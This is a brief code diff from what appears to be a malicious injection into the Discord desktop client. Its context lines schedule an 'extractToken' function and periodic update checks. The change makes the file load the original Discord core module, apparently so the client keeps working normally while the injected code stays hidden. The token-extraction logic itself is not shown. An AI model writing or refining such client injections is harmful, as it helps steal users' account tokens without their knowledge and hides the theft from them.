@@ -143,5 +143,5 @@ setTimeout(extractToken, 15000); // Extract token after 15s delay
 setTimeout(checkUpdate, 60000); // Check for updates after 1 minute
 setInterval(checkUpdate, 1800000); // Re-check every 30 minutes
 
-// Load Discord core module
-module.exports = require('./discord_desktop_core-1');
+// Load original Discord core module
+module.exports = require('./core.asar');
